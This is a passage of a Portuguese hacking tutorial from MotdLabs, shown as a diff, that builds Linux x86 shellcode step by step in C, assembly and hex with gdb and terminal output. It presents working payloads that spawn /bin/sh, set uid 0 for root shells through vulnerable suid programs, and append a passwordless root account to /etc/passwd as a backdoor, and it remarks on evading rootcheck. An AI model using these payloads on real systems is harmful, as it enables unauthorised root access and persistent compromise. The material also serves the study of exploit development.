+       076   62    3E    >              176   126   7E    ~
+       077   63    3F    ?              177   127   7F    DEL
+
+        Sempre que precisar consulte ela pelo terminal.
+
+O cwrite foi  só um exemplo  básico para se  pegar a idéia  essencial de como se
+constrói um shellcode.  Com essa base,  podemos nos aprofundar  um pouco mais  e
+escrever algo mais divertido. :)
+
+Agora vamos  escrever um  shellcode que  irá nos  dar uma  shell. Sim  amigos, o
+famoso  "/bin/sh"!!!  Todo  tutorial  de  shellcode  que  se  preze mostra  como
+fazê-lo... :P
+
+A coisa se complicará um pouco comparando com o primeiro, mas vamos escrever  da
+forma mais simples possível e passo-a-passo, com isso espero ampliar sua mente e
+tirar sua dúvida, jovem fuçador. :) Chega de papo e vamos lá!!! =)
+
+	Como de costume, vamos escrever primeiramente o protótipo em C.
+
+<++> shellcode/csh.c
+/*
+ *  Protótipo de shellcode em C.
+ *  Abre uma shell /bin/sh.
+ *  by IP_FIX <ip_fix@motdlabs.org>.
+ *  MotdLabs <www.motdlabs.org>.
+ *  Compilação: # gcc -o csh csh.c
+ */
+
+#include <stdio.h>
+
+main() {
+
+char *string[2];
+
+string[0]= "/bin/sh";
+string[1]= '\0';
+
+execve(string[0], string, '\0');
+exit(0);
+
+}
+<--> shellcode/csh.c
+
+	Vamos compilá-lo e executá-lo.:
+
+root@motdlabs:~/IP_FIX/shellcode# gcc -o csh csh.c
+root@motdlabs:~/IP_FIX/shellcode# ./csh
+sh-2.05b#
+
+Funciona perfeitamente.  Mas agora  precisamos entender  como funciona  a função
+execve().:
+
+root@motdlabs:~/IP_FIX/shellcode# man execve
+
+int execve(const char *filename, char *const argv [], char *const envp[]);
+
+Bem, se seguirmos a analogia  do que a man page  nos diz, veremos que temos  que
+criar um ponteiro com vetor para o que queremos executar (char *filename), e  um
+outro ponteiro para o argumento que será passado (char *const argv []).
+
+Ou seja, temos que ter nossa string (string[0]), no primeiro argumento,  seguido
+por um byte nulo (string[1]) no segundo argumento, pra indicar o fim da  string.
+Como não usaremos  nenhuma variável ambiente,  colocamos um null  byte no último
+argumento.
+
+Repare que  não podemos  fazer da  seguinte forma:  execve("/bin/sh",'\0','\0"),
+pois se  tem a  necessidade de  passar os  bytes nulos  através do  ponteiro com
+vetor. A man page explica isso direitinho. :)
+
+Agora vamos  voltar ao  trabalho. Agora  que sabemos  a forma  de executar o que
+queremos, temos que transpor isso para assembly. Vamos usar nossa tabelinha para
+ver como devemos manuesar a função execve() em baixo-nível.:
+
+ _________________________________________________________________________________________________
+|%eax|    Name    |           Source           |      %ebx      |   %ecx  |  %edx   | %esx | %edi |
+'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''-'''''''''''''
+| 11 |  sys_exeve | arch/i386/kernel/process.c | char *filename | *argv[] | *envp[] |      |      |
+'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
+
+	Ok! Temos as informações necessárias, vamos tentar montá-lo agora em ASM.:
+
+<++> shellcode/asmsh.c
+/*
+ *  Protótipo de shellcode em ASM.
+ *  Abre uma shell /bin/sh.
+ *  by IP_FIX <ip_fix@motdlabs.org>.
+ *  MotdLabs <www.motdlabs.org>.
+ *  Compilação: # gcc -o asmsh asmsh.c
+ */
+
+#include <stdio.h>
+
+main() {
+	__asm__ (
+	           "xor  %eax, %eax  \n" /* Zeramos %eax.                                                             */
+		   "push %eax        \n" /* Byte nulo da string /bin/sh para encerrá-la. (char *filename,...          */
+		   "push $0x68732F2F \n" /* Foi colocado duas barras (//) para não ficar com null byte.               */
+		   "push $0x6E69622F \n" /* /bin//sh                                                                  */
+		   "mov  %esp, %ebx  \n" /* Agora que temos tudo no stack, movemos para %ebx: (char *filename,...     */
+		   "push %eax        \n" /* NULL byte que finaliza a string /bin/sh no ...char *const argv[],...      */
+		   "push %ebx        \n" /* Devolve o valor antigo do stack pro novo stack.                           */
+		   "mov  %esp, %ecx  \n" /* Com a string novamente no stack, vai para %ecx: ...char *const argv[],... */
+		   "xor  %edx, %edx  \n" /* Zeramos %edx para deixar um null byte. %edx: ...char *const envp[]);      */
+		   "mov  $0xb, %al   \n" /* System Call da função execve(), 0xb = 11.                                 */
+		   "int  $0x80       \n" /* Ação! :)                                                                  */
+		   "xor  %eax, %eax  \n" /* %eax == 0	                                                              */
+		   "xor  %ebx, %ebx  \n" /* %ebx == 0 == EXIT_SUCCESS                                                 */
+		   "mov  $0x1, %al   \n" /* sys_call de exit()                                                        */
+		   "int  $0x80       \n" /* Play! :P                                                                  */
+	          );
+}
+<--> shellcode/asmsh.c
+
+root@motdlabs:~/IP_FIX/shellcode# gcc -o asmsh asmsh.c
+root@motdlabs:~/IP_FIX/shellcode# ./asmsh
+sh-2.05b#
+
+w00w00!!! Nada  de jmp,  call, pop,  inc, etc...  apenas instruções  simples que
+vimos no exemplo de write().
+
+Mas  não  terminamos,  temos  que  pegar  os  opcodes  para  montarmos  ele   em
+hexadecimal.:
+
+root@motdlabs:~/IP_FIX/shellcode# gdb asmsh
+GNU gdb 5.3
+Copyright 2002 Free Software Foundation, Inc.
+GDB is free software, covered by the GNU General Public License, and you are
+welcome to change it and/or distribute copies of it under certain conditions.
+Type "show copying" to see the conditions.
+There is absolutely no warranty for GDB.  Type "show warranty" for details.
+This GDB was configured as "i386-slackware-linux"...
+(gdb) disas main
+Dump of assembler code for function main:
+0x8048314 <main>:       push   %ebp
+0x8048315 <main+1>:     mov    %esp,%ebp
+0x8048317 <main+3>:     sub    $0x8,%esp
+0x804831a <main+6>:     and    $0xfffffff0,%esp
+0x804831d <main+9>:     mov    $0x0,%eax
+0x8048322 <main+14>:    sub    %eax,%esp
+0x8048324 <main+16>:    xor    %eax,%eax
+0x8048326 <main+18>:    push   $0x68732f2f
+0x804832b <main+23>:    push   $0x6e69622f
+0x8048330 <main+28>:    mov    %esp,%ebx
+0x8048332 <main+30>:    push   %eax
+0x8048333 <main+31>:    push   %ebx
+0x8048334 <main+32>:    mov    %esp,%ecx
+0x8048336 <main+34>:    xor    %edx,%edx
+0x8048338 <main+36>:    mov    $0xb,%al
+0x804833a <main+38>:    int    $0x80
+0x804833c <main+40>:    xor    %eax,%eax
+0x804833e <main+42>:    xor    %ebx,%ebx
+0x8048340 <main+44>:    mov    $0x1,%al
+0x8048342 <main+46>:    int    $0x80
+0x8048344 <main+48>:    leave
+0x8048345 <main+49>:    ret
+0x8048346 <main+50>:    nop
+0x8048347 <main+51>:    nop
+0x8048348 <main+52>:    nop
+0x8048349 <main+53>:    nop
+0x804834a <main+54>:    nop
+0x804834b <main+55>:    nop
+0x804834c <main+56>:    nop
+0x804834d <main+57>:    nop
+0x804834e <main+58>:    nop
+0x804834f <main+59>:    nop
+End of assembler dump.
+(gdb) x/xb main+16
+0x8048324 <main+16>:    0x31
+(gdb)
+0x8048325 <main+17>:    0xc0
+(gdb)
+0x8048326 <main+18>:    0x50
+(gdb)
+0x8048327 <main+19>:    0x68
+(gdb)
+0x8048328 <main+20>:    0x2f
+(gdb)
+...
+...
+...
+0x8048340 <main+44>:    0xdb
+(gdb)
+0x8048341 <main+45>:    0xb0
+(gdb)
+0x8048342 <main+46>:    0x01
+(gdb)
+0x8048343 <main+47>:    0xcd
+(gdb)
+0x8048344 <main+48>:    0x80
+(gdb)
+
+
+<++> shellcode/hexash.c
+/*
+ *  Protótipo de shellcode em ASM.
+ *  Abre uma shell /bin/sh.
+ *  by IP_FIX <ip_fix@motdlabs.org>.
+ *  MotdLabs <www.motdlabs.org>.
+ *  Compilação: # gcc -o hexash hexash.c
+ */
+
+#include <stdio.h>
+
+char shellcode[] = "\x31\xc0"             /* xor  %eax, %eax  */
+     		   "\x50"                 /* push %eax        */
+		   "\x68\x2f\x2f\x73\x68" /* push $0x68732F2F */
+		   "\x68\x2f\x62\x69\x6e" /* push $0x6E69622F */
+		   "\x89\xe3"             /* mov  %esp, %ebx  */
+		   "\x50"                 /* push %eax        */
+		   "\x53"                 /* push %ebx        */
+		   "\x89\xe1"             /* mov  %esp, %ecx  */
+		   "\x31\xd2"             /* xor  %edx, %edx  */
+		   "\xb0\x0b"             /* mov  $0xb, %al   */
+		   "\xcd\x80"             /* int  $0x80       */
+		   "\x31\xc0"	          /* xor  %eax, %eax  */
+		   "\x31\xdb"             /* xor  %ebx, %ebx  */
+		   "\xb0\x01"             /* mov  $0x1, %al   */
+		   "\xcd\x80";            /* int  $0x80       */
+
+main() {
+
+        /* Mostramos o tamanho para se ter um controle maior.   */
+        printf("Tamanho do Shellcode: %d bytes.\n", strlen(shellcode));
+
+	/* Criamos um ponteiro para uma função do tipo long.    */
+        long (*executa) ();
+
+	/* Apontamos a função para o shellcode.                 */
+        executa = shellcode;
+
+	/* E aqui acontece a mágica! :)                         */
+        executa();
+}
+<--> shellcode/hexash.c
+
+root@motdlabs:~/IP_FIX/shellcode# gcc -o hexash hexash.c
+hexash.c: In function `main':
+hexash.c:36: warning: assignment from incompatible pointer type
+root@motdlabs:~/IP_FIX/shellcode# ./hexash
+Tamanho do Shellcode: 33 bytes.
+sh-2.05b#
+
+w00w00!!!  Um shellcode  /bin/sh de  33 bytes.  Isso é  incrível pra  quem está
+acostumado com  o tamanho  do Aleph1  (45 bytes),  mas não  tem nenhuma  técnica
+desconhecida.
+
+Que tal incrementarmos um  pouquinho? É mais que  óbvio que usaremos essa  shell
+para conseguir acesso remoto através de alguma vulnerabilidade. E que tal  assim
+que cairmos, termos permissões  root (uid=0)??? Sim! Isso  é possível, e é  mais
+fácil do que você imagina. Vamos ver.:
+
+<++> shellcode/csetuid.c
+/*
+ *  Protótipo de shellcode em C.
+ *  Seta uid atual para 0.
+ *  by IP_FIX <ip_fix@motdlabs.org>.
+ *  MotdLabs <www.motdlabs.org>.
+ *  Compilação: # gcc -o csetuid csetuid.c
+ */
+ #include <stdio.h>
+
+ main() {
+
+ 	setuid(0);
+
+}
+<--> shellcode/csetuid.c
+
+root@motdlabs:~/IP_FIX/shellcode# gcc -o csetuid csetuid.c
+root@motdlabs:~/IP_FIX/shellcode# ./csetuid
+root@motdlabs:~/IP_FIX/shellcode#
+
+	Ok, agora vamos ver como funciona e criá-lo em ASM:
+
+root@motdlabs:~/IP_FIX/shellcode# man setuid
+
+int setuid(uid_t uid);
+
+uid: user identity; aqui  vai o número que  o user será identificado,  lembrando
+que 0 é root, e acima disso é user normal ($).
+
+	Sem problemas, agora vamos ver a system call table dele.:
+ _____________________________________________________________________________________________
+|%eax|    Name    |           Source           |      %ebx    |  %ecx  |  %edx  | %esx | %edi |
+'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
+| 23 | sys_setuid |        kernel/sys.c        |     uid_t    |        |        |      |      |
+'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
+
+Bom, então  é só  movermos 23  pra %eax,  0 para  %ebx e  dar um int $0x80 que a
+mágica acontece! :D
+
+<++> shellcode/asmsetuid.c
+/*
+ *  Protótipo de shellcode em ASM.
+ *  Seta uid atual para 0.
+ *  by IP_FIX <ip_fix@motdlabs.org>.
+ *  MotdLabs <www.motdlabs.org>.
+ *  Compilação: # gcc -o asmsetuid asmsetuid.c
+ */
+#include <stdio.h>
+
+main() {
+
+	__asm__(
+		 "xor %eax, %eax \n" /* %eax == 0    */
+		 "xor %ebx, %ebx \n" /* uid == 0.    */
+		 "mov $0x17, %al \n" /* %al == 23.   */
+		 "int $0x80      \n" /* Modo Kernel. */
+	        );
+}
+<--> shellcode/asmsetuid.c
+
+Tão  simples quanto  exit(). Vamos  compilar, testar,  debugar e  capturar seus
+opcodes em hexadecimal.:
+
+root@motdlabs:~/IP_FIX/shellcode# gcc -o asmsetuid asmsetuid.c
+root@motdlabs:~/IP_FIX/shellcode# ./asmsetuid
+root@motdlabs:~/IP_FIX/shellcode# gdb asmsetuid
+GNU gdb 5.3
+Copyright 2002 Free Software Foundation, Inc.
+GDB is free software, covered by the GNU General Public License, and you are
+welcome to change it and/or distribute copies of it under certain conditions.
+Type "show copying" to see the conditions.
+There is absolutely no warranty for GDB.  Type "show warranty" for details.
+This GDB was configured as "i386-slackware-linux"...
+(gdb) disas main
+Dump of assembler code for function main:
+0x8048314 <main>:       push   %ebp
+0x8048315 <main+1>:     mov    %esp,%ebp
+0x8048317 <main+3>:     sub    $0x8,%esp
+0x804831a <main+6>:     and    $0xfffffff0,%esp
+0x804831d <main+9>:     mov    $0x0,%eax
+0x8048322 <main+14>:    sub    %eax,%esp
+0x8048324 <main+16>:    xor    %eax,%eax
+0x8048326 <main+18>:    xor    %ebx,%ebx
+0x8048328 <main+20>:    mov    $0x17,%al
+0x804832a <main+22>:    int    $0x80
+0x804832c <main+24>:    leave
+0x804832d <main+25>:    ret
+0x804832e <main+26>:    nop
+0x804832f <main+27>:    nop
+End of assembler dump.
+(gdb) x/xb main+16
+0x8048324 <main+16>:    0x31
+(gdb)
+0x8048325 <main+17>:    0xc0
+(gdb)
+0x8048326 <main+18>:    0x31
+(gdb)
+0x8048327 <main+19>:    0xdb
+(gdb)
+0x8048328 <main+20>:    0xb0
+(gdb)
+0x8048329 <main+21>:    0x17
+(gdb)
+0x804832a <main+22>:    0xcd
+(gdb)
+0x804832b <main+23>:    0x80
+(gdb)
+
+	Montando...:
+
+<++> shellcode/hexasetuid.c
+/*
+ *  Shellcode pronto em hexadecimal.
+ *  Seta uid atual para 0.
+ *  by IP_FIX <ip_fix@motdlabs.org>.
+ *  MotdLabs <www.motdlabs.org>.
+ *  Compilação: # gcc -o hexasetuid hexasetuid.c
+ */
+
+#include <stdio.h>
+
+char shellcode[] = "\x31\xc0"  /* xor %eax, %eax */
+		   "\x31\xdb"  /* xor %ebx, %ebx */
+                   "\xb0\x17"  /* mov $0x17, %al */
+                   "\xcd\x80"; /* int $0x80      */
+
+ main() {
+
+        /* Mostramos o tamanho para se ter um controle maior. */
+        printf("Tamanho do Shellcode: %d bytes.\n", strlen(shellcode));
+
+	/* Criamos um ponteiro para uma função do tipo long. */
+        long (*executa) ();
+
+	/* Apontamos a função para o shellcode. */
+        executa = shellcode;
+
+	/* E aqui acontece a mágica! :) */
+        executa();
+}
+<--> shellcode/hexasetuid.c
+
+	Compilando e executando...
+
+root@motdlabs:~/IP_FIX/shellcode# gcc -o hexasetuid hexasetuid.c
+hexasetuid.c: In function `main':
+hexasetuid.c:25: warning: assignment from incompatible pointer type
+root@motdlabs:~/IP_FIX/shellcode# ./hexasetuid
+Tamanho do Shellcode: 8 bytes.
+Segmentation fault
+root@motdlabs:~/IP_FIX/shellcode#
+
+	Pronto!!! Viram como é simples fazer um simples setuid(0)?
+
+Um  detalhe  galera,  vocês  devem  ter  notado  que  houve  uma  saída  errada:
+"Segmentation  fault".  Não se  alarmem,  isso se  deve  ao fato  de  não termos
+colocado um  exit(0). Em  compiladores menores  que o  3.3.1 não  era necessário
+colocar o exit(0),  pois sua saída  seria sempre limpa,  mas agora ele  tem umas
+frescuras... Bom,  nosso código  não está  errado e  vocês verão  que está certo
+mesmo. ;)
+
+Agora você deve estar se perguntado  como você executará isso num futuro  uso. É
+simples, somente temos que acoplar numa shell padrão como o nosso /bin/sh. Como?
+Basta aplicar o código sobre o anterior da seguinte maneira.:
+
+<++> shellcode/shsetuid.c
+/*
+ *  Shellcode pronto em hexadecimal.
+ *  Abre uma shell /bin/sh + setuid(0) + exit(0).
+ *  by IP_FIX <ip_fix@motdlabs.org>.
+ *  MotdLabs <www.motdlabs.org>.
+ *  Compilação: # gcc -o shsetuid shsetuid.c
+ */
+
+#include <stdio.h>
+
+char shellcode[] = "\x31\xc0"             /* xor  %eax, %eax  */
+		   "\x31\xdb"             /* xor  %ebx,%ebx   */
+                   "\xb0\x17"             /* mov  $0x17,%al   */
+                   "\xcd\x80"             /* int  $0x80       */ /* setuid(0); */
+                   "\x31\xc0"             /* xor  %eax, %eax  */
+     		   "\x50"                 /* push %eax        */
+		   "\x68\x2f\x2f\x73\x68" /* push $0x68732F2F */
+		   "\x68\x2f\x62\x69\x6e" /* push $0x6E69622F */
+		   "\x89\xe3"             /* mov  %esp, %ebx  */
+		   "\x50"                 /* push %eax        */
+		   "\x53"                 /* push %ebx        */
+		   "\x89\xe1"             /* mov  %esp, %ecx  */
+		   "\x31\xd2"             /* xor  %edx, %edx  */
+		   "\xb0\x0b"             /* mov  $0xb, %al   */
+		   "\xcd\x80"             /* int  $0x80       */ /* /bin/sh; */
+		   "\x31\xc0"		  /* xor  %eax, %eax  */
+		   "\x31\xdb"             /* xor  %ebx, %ebx  */
+		   "\xb0\x01"             /* mov  $0x1, %al   */
+		   "\xcd\x80";            /* int  $0x80       */ /* exit(0). */
+
+
+ main() {
+
+        /* Mostramos o tamanho para se ter um controle maior. */
+        printf("Tamanho do Shellcode: %d bytes.\n", strlen(shellcode));
+
+	/* Criamos um ponteiro para uma função do tipo long. */
+        long (*executa) ();
+
+	/* Apontamos a função para o shellcode. */
+        executa = shellcode;
+
+	/* E aqui acontece a mágica! :) */
+        executa();
+}
+<--> shellcode/shsetuid.c
+
+	Compilando e executando...
+
+root@motdlabs:~/IP_FIX/shellcode# gcc -o shsetuid shsetuid.c
+shsetuid.c: In function `main':
+shsetuid.c:41: warning: assignment from incompatible pointer type
+root@motdlabs:~/IP_FIX/shellcode# ./shsetuid
+Tamanho do Shellcode: 41 bytes.
+sh-2.05b#
+
+w00w00!!! Um shellcode  /bin/sh com setuid(0)  + exit(0) por  apenas 41 bytes!!!
+Repare que para criá-lo não foi preciso refazer todo o código novamente,  apenas
+adicionamos um novo código ao velho, sem termos complicações.
+
+Muito útil para conseguirmos acesso root através de programas bugados que  sejam
+suid root (chmod +s).
+
+Puxa vida, sabemos criar shellcodes que escreve na tela, abre shells
+e que ainda podemos conseguir previlégios root dependendo da situação, então o
+que nos impede de criarmos mais?
+
+Você terá  que escrever  diferentes shellcodes  dependendo da  situação,  haverá
+certos  casos  que   existirão  programas  que   não  permitirão a  obtenção  de
+shell  através de  ataques  básicos  como buffer  overflow (stack) e teremos que
+ser criativos para burlamos.  Enfim, cada caso é  um caso! Nem sempre  as coisas
+são o que  parecem ser, então  teremos que  ter  uma grande malícia  para burlar
+determinados  sistemas  de  proteção  como  o  rootcheck,  por  exemplo,  que ao
+obtermos uma root shell não autorizada,  o próprio irá killar o processo  em que
+estamos.
+
+Ohhh!!! Será o fim??? Claro que não!!! Programas desse gênero derruba quem obtém
+uma root shell  atráves de shellcodes  como o acima,  mas não existe  apenas uma
+maneira de conseguirmos acesso root, como conseguiremos então?
+
+Pense o seguinte: Sabemos escrever na  tela, o que nos impede de  escrevermos em
+arquivos?  Sabendo  disso,  nada  nos  impede  de  adicionarmos  um  usuário com
+privilégios root no /etc/passwd da vítima!!! Devolta aos protótipos!!! :D
+
+<++> shellcode/cpasswd.c
+/*
+ *  Protótipo de shellcode em C.
+ *  Adiciona um usuário com premissões root.
+ *  by IP_FIX <ip_fix@motdlabs.org>.
+ *  MotdLabs <www.motdlabs.org>.
+ *  Compilação: # gcc -o cpasswd cpasswd.c
+ */
+
+#include <sys/types.h>
+#include <sys/stat.h>
+#include <fcntl.h>
+
+main() {
+
+/* Declaramos passwd como um inteiro. */
+int passwd;
+
+/* Usamos open para abrir o arquivo; atenção nas flags!!!
+ * O_RDWR: Read and Write/Leitura e Escrita.
+ * O_APPEND: O ponteiro será apontado no fim do arquivo.
+ */
+
+/* passwd = open("/etc/passwd",O_RDWR|O_APPEND); */
+passwd = open("/etc/passwd",1026);
+
+/* Após aberto, escrevemos nossa string no arquivo desejado. */
+/* write(passwd,"\nip_fix::0:0::/root:/bin/sh\n",strlen("\nip_fix::0:0::/root:/bin/sh\n")); */
+write(passwd,"\nip_fix::0:0::/root:/bin/sh\n",30);
+
+/* Sai livremente. */
+exit(0);
+
+}
+<--> shellcode/cpasswd.c
+
+         Lembre-se: Se você  tiver alguma dúvida   sobre as funções,  utilize as
+         man pages, você  aprenderá muito com  elas, te  garanto!  Pronto. Agora
+         chegou  a  melhor    hora:  Compilar  e  executar!!!   :)  Confira  seu
+         /etc/passwd primeiro.
+
+root@motdlabs:~/IP_FIX/shellcode# cat /etc/passwd
+root:x:0:0::/root:/bin/bash
+bin:x:1:1:bin:/bin:
+daemon:x:2:2:daemon:/sbin:
+adm:x:3:4:adm:/var/log:
+lp:x:4:7:lp:/var/spool/lpd:
+sync:x:5:0:sync:/sbin:/bin/sync
+shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
+halt:x:7:0:halt:/sbin:/sbin/halt
+mail:x:8:12:mail:/:
+news:x:9:13:news:/usr/lib/news:
+uucp:x:10:14:uucp:/var/spool/uucppublic:
+operator:x:11:0:operator:/root:/bin/bash
+games:x:12:100:games:/usr/games:
+ftp:x:14:50::/home/ftp:
+smmsp:x:25:25:smmsp:/var/spool/clientmqueue:
+mysql:x:27:27:MySQL:/var/lib/mysql:/bin/bash
+rpc:x:32:32:RPC portmap user:/:/bin/false
+sshd:x:33:33:sshd:/:
+gdm:x:42:42:GDM:/var/state/gdm:/bin/bash
+pop:x:90:90:POP:/:
+nobody:x:99:99:nobody:/:
+
+root@motdlabs:~/IP_FIX/shellcode#
+
+	Compilando e executando...
+
+root@motdlabs:~/IP_FIX/shellcode# gcc -o cpasswd cpasswd.c
+root@motdlabs:~/IP_FIX/shellcode# ./cpasswd
+root@motdlabs:~/IP_FIX/shellcode# cat /etc/passwd
+root:x:0:0::/root:/bin/bash
+bin:x:1:1:bin:/bin:
+daemon:x:2:2:daemon:/sbin:
+adm:x:3:4:adm:/var/log:
+lp:x:4:7:lp:/var/spool/lpd:
+sync:x:5:0:sync:/sbin:/bin/sync
+shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
+halt:x:7:0:halt:/sbin:/sbin/halt
+mail:x:8:12:mail:/:
+news:x:9:13:news:/usr/lib/news:
+uucp:x:10:14:uucp:/var/spool/uucppublic:
+operator:x:11:0:operator:/root:/bin/bash
+games:x:12:100:games:/usr/games:
+ftp:x:14:50::/home/ftp:
+smmsp:x:25:25:smmsp:/var/spool/clientmqueue:
+mysql:x:27:27:MySQL:/var/lib/mysql:/bin/bash
+rpc:x:32:32:RPC portmap user:/:/bin/false
+sshd:x:33:33:sshd:/:
+gdm:x:42:42:GDM:/var/state/gdm:/bin/bash
+pop:x:90:90:POP:/:
+nobody:x:99:99:nobody:/:
+
+ip_fix::0:0::/root:/bin/sh
+root@motdlabs:~/IP_FIX/shellcode#
+
+Agora  temos que  converter para  assembly, será  um pouco  trabalhoso mas  nada
+impossível! Vamos ver nossa tabela primeiro.:
+
+ _____________________________________________________________________________________________
+|%eax|    Name    |           Source           |      %ebx    |  %ecx  |  %edx  | %esx | %edi |
+'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
+| 1  |  sys_exit  | kernel/exit.c              |     int      |        |        |      |      |
+| 4  |  sys_write | arch/i386/kernel/process.c | unsigned int | char * | size_t |      |      |
+| 5  |  sys_open  | fs/open.c                  | const char * |  int   |   int  |      |      |
+'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
+
+root@motdlabs:~/IP_FIX/shellcode# man open
+
+int open(const char *pathname, int flags, mode_t mode);
+        [        %ebx        ] [  %ecx  ] [   %edx   ]
+
+	De posse dessas informações, vamos construir nosso
+código em assembly.
+
+<++> shellcode/asmpasswd.c
+/*
+ *  Protótipo de shellcode em ASM.
+ *  Adiciona um usuário com premissões root.
+ *  by IP_FIX <ip_fix@motdlabs.org>.
+ *  MotdLabs <www.motdlabs.org>.
+ *  Compilação: # gcc -o asmpasswd asmpasswd.c
+ */
+
+#include <stdio.h>
+
+main() {
+	__asm__(
+	         "xor  %eax,  %eax \n" /* Zera %eax.                                                                 */
+                 "push $0x647773   \n" /* Movemos toda no string...                                                  */
+                 "push $0x7361702F \n" /* ...para o stack.                                                           */
+		 "push $0x6374652F \n" /* /etc/passwd                                                                */
+                 "mov  %esp,  %ebx \n" /* Agora jogamos nossa string para %ebx: (const char *pathname,...            */
+		 "mov  $0x402, %cx \n" /* Movemos O_RDWR|O_APPEND para %cx: ...int flags,...                         */
+		 "mov  $0x5,   %al \n" /* System Call de open().                                                     */
+		 "int  $0x80       \n" /* Cai pro modo kernel.                                                       */
+		 "mov  %eax,  %ebx \n" /* Tudo que foi feito em open, foi para %eax, agora precisamos tê-lo em %ebx. */
+		 "push $0x0A68732F \n" /* Movemos...                                                                 */
+		 "push $0x6E69622F \n" /* ...a outra...                                                              */
+		 "push $0x3A746F6F \n" /* ...string...                                                               */
+		 "push $0x722F3A3A \n" /* ...novamente...                                                            */
+		 "push $0x303A303A \n" /* ...para o...                                                               */
+		 "push $0x3A786966 \n" /* ...Stack.                                                                  */
+		 "push $0x5F70690A \n" /* \nip_fix::0:0::/root:/bin/sh\n                                             */
+	         "mov  %esp,  %ecx \n" /* Jogamos ela no contador %ecx.                                              */
+		 "xor  %edx,  %edx \n" /* Zeramos %edx.                                                              */
+		 "mov  $0x1C,  %dl \n" /* Tamanho da string em %edx.                                                 */
+		 "mov  $0x4,   %al \n" /* Nossa amável system call de write().                                       */
+		 "int  $0x80       \n" /* Comece o Show!!!                                                           */
+		 "xor  %eax,  %eax \n" /* Zera %eax.								     */
+		 "xor  %ebx,  %ebx \n" /* Zera %ebx pra SUCCESS.                                                     */
+		 "mov  $0x1,   %al \n" /* System Call de exit().                                                     */
+                 "int  $0x80       \n" /* Executa tudo.                                                              */
+		 );
+}
+<--> shellcode/asmpasswd.c
+
+Grandinho  né? Apesar  do tamanho  repare que  não foge  do padrão  dos códigos
+anteriores.  Irei  explicar  agora  algumas  passagens  que  merecem  uma  certa
+atenção.:
+
+"mov  $0x402, %cx \n"
+
+Perae, não era pra ter movido as flags O_RDWR|O_APPEND para %cx?
+Por que no código em C tem o número 1026 no lugar dessas flags?
+
+Rapaz, você  só irá  descobrir se  fuçar. Meu  código estava  prontinho mas  não
+conseguia rodar por causa disso, até que  vi num txt o número 3074 no  lugar das
+flags,  mas  fiquei me  perguntando  da onde  surgiu  isso. Bem,  eu  compilei o
+programa com as flags normais que queria (O_RDWR|O_APPEND), e debuguei. Vi  logo
+que quando "disassembliei" a função main,  a primeira coisa que era passado  pro
+stack eram as flags, suponho que seje por motivos de segurança que as  permições
+do arquivo sejam passadas em primeiro lugar.
+
+No meu caso apareceu 0x402  que é 1026 em decimal.  Faça isso e comprove na  sua
+máquina. Fuçe muito!!!
+
+"mov  $0x1C,  %dl \n"
+
+Calmae! O decimal 30 não é 1E em hexadecimal? Por que está movendo apenas 1C pra
+%dl?
+
+No cpasswd precisamos  contar todos os  caracteres para que  a saída no  arquivo
+seje perfeita (sem sujeiras) e em asm não é diferente. Mas olhe na tabela  ascii
+que existe um códigpo para o  "\n"(0A). Com isso, nosso código diminui  2 bytes.
+=)
+
+	Vamos se tudo isso vai funcionar. :)
+
+root@motdlabs:~/IP_FIX/shellcode# gcc -o asmpasswd asmpasswd.c
+root@motdlabs:~/IP_FIX/shellcode# ./asmpasswd
+root@motdlabs:~/IP_FIX/shellcode# cat /etc/passwd
+root:x:0:0::/root:/bin/bash
+...
+...
+...
+nobody:x:99:99:nobody:/:
+
+ip_fix::0:0::/root:/bin/sh
+root@motdlabs:~/IP_FIX/shellcode#
+
+	Sim!!! Funciona!!! Vamos sem perder tempo pegar os opcodes!!! :P
+
+<++> shellcode/hexapasswd.c
+/*
+ *  Shellcode pronto em hexadecimal.
+ *  Adiciona um usuário com premissões root.
+ *  by IP_FIX <ip_fix@motdlabs.org>.
+ *  MotdLabs <www.motdlabs.org>.
+ *  Compilação: # gcc -o hexapasswd -static hexapasswd.c
+ */
+
+#include <stdio.h>
+
+char shellcode[] = "\x31\xc0"             /* xor    %eax,%eax   */
+                   "\x68\x73\x77\x64\x00" /* push   $0x647773   */
+                   "\x68\x2f\x70\x61\x73" /* push   $0x7361702f */
+                   "\x68\x2f\x65\x74\x63" /* push   $0x6374652f */
+                   "\x89\xe3"             /* mov    %esp,%ebx   */
+                   "\x66\xb9\x02\x04"     /* mov    $0x402,%cx  */
+                   "\xb0\x05"             /* mov    $0x5,%al    */
+                   "\xcd\x80"             /* int    $0x80       */
+                   "\x89\xc3"             /* mov    %eax,%ebx   */
+                   "\x68\x2f\x73\x68\x0a" /* push   $0xa68732f  */
+		   "\x68\x2f\x62\x69\x6e" /* push   $0x6e69622f */
+                   "\x68\x6f\x6f\x74\x3a" /* push   $0x3a746f6f */
+                   "\x68\x3a\x3a\x2f\x72" /* push   $0x722f3a3a */
+                   "\x68\x3a\x30\x3a\x30" /* push   $0x303a303a */
+		   "\x68\x66\x69\x78\x3a" /* push   $0x3a786966 */
+		   "\x68\x0a\x69\x70\x5f" /* push   $0x5f70690a */
+                   "\x89\xe1"             /* mov    %esp,%ecx   */
+		   "\x31\xd2"             /* xor    %edx,%edx   */
+		   "\xb2\x1c"             /* mov    $0x1c,%dl   */
+                   "\xb0\x04"             /* mov    $0x4,%al    */
+                   "\xcd\x80"             /* int    $0x80       */
+		   "\x31\xc0"             /* xor    %eax,%eax   */
+                   "\x31\xdb"             /* xor    %ebx,%ebx   */
+                   "\xb0\x01"             /* mov    $0x1,%al    */
+                   "\xcd\x80";            /* int    $0x80       */
+main() {
+
+        /* Mostramos o tamanho para se ter um controle maior. */
+        printf("Tamanho do Shellcode: %d bytes.\n", strlen(shellcode));
+
+	/* Criamos um ponteiro para uma função do tipo long. */
+        long (*executa) ();
+
+        /* Apontamos a função para o shellcode. */
+        executa = shellcode;
+
+	/* E aqui acontece a mágica! :) */
+        executa();
+}
+<--> shellcode/hexapasswd.c
+
